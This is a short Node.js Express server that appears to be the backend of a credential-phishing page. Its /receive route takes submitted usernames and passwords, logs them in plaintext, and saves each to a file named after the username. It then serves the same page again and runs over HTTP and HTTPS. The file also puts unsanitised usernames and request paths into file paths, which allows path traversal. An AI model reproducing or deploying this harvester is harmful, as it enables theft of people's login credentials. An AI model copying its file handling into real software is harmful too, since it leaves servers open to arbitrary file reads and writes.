var express = require('express'),
    fs = require('fs'),
    http = require('http'),
    https = require('https'),
    url = require('url');
var app = express();

app.post('/receive', function (request, respond) {
    var body = '';
    request.on('data', function (data) {
        body += data;
        var logs = String('username: ' + form2Json(body).username + ' password: ' + form2Json(body).password);
        console.log(logs);
        var writer = fs.createWriteStream('./data/' + form2Json(body).username + '.txt');
        writer.write(logs);
        respond.sendfile('./dist/index.html')
    });
});

app.get("/", function (req, res) {
    res.sendfile('./dist/index.html')
});

app.get(/^(.+)$/, function (req, res) {
    res.sendfile(__dirname + '/dist' + req.params[0]);
});

var options = {
    key: fs.readFileSync('../2/server.key'),
    cert: fs.readFileSync('../2/server.crt'),
};

var httpServer = http.createServer(app);
var httpsServer = https.createServer(options, app);

httpServer.listen(8080);
httpsServer.listen(8880);




// ---------------------------------------

function form2Json(str) {
    "use strict";
    var obj, i, pt, keys, j, ev;
    if (typeof form2Json.br !== 'function') {
        form2Json.br = function (repl) {
            if (repl.indexOf(']') !== -1) {
                return repl.replace(/\](.+?)(,|$)/g, function ($1, $2, $3) {
                    return form2Json.br($2 + '}' + $3);
                });
            }
            return repl;
        };
    }
    str = '{"' + (str.indexOf('%') !== -1 ? decodeURI(str) : str) + '"}';
    obj = str.replace(/\=/g, '":"').replace(/&/g, '","').replace(/\[/g, '":{"');
    obj = JSON.parse(obj.replace(/\](.+?)(,|$)/g, function ($1, $2, $3) {
        return form2Json.br($2 + '}' + $3);
    }));
    pt = ('&' + str).replace(/(\[|\]|\=)/g, '"$1"').replace(/\]"+/g, ']').replace(/&([^\[\=]+?)(\[|\=)/g, '"&["$1]$2');
    pt = (pt + '"').replace(/^"&/, '').split('&');
    for (i = 0; i < pt.length; i++) {
        ev = obj;
        keys = pt[i].match(/(?!:(\["))([^"]+?)(?=("\]))/g);
        for (j = 0; j < keys.length; j++) {
            if (!ev.hasOwnProperty(keys[j])) {
                if (keys.length > (j + 1)) {
                    ev[keys[j]] = {};
                } else {
                    ev[keys[j]] = pt[i].split('=')[1].replace(/"/g, '');
                    break;
                }
            }
            ev = ev[keys[j]];
        }
    }
    return obj;
}
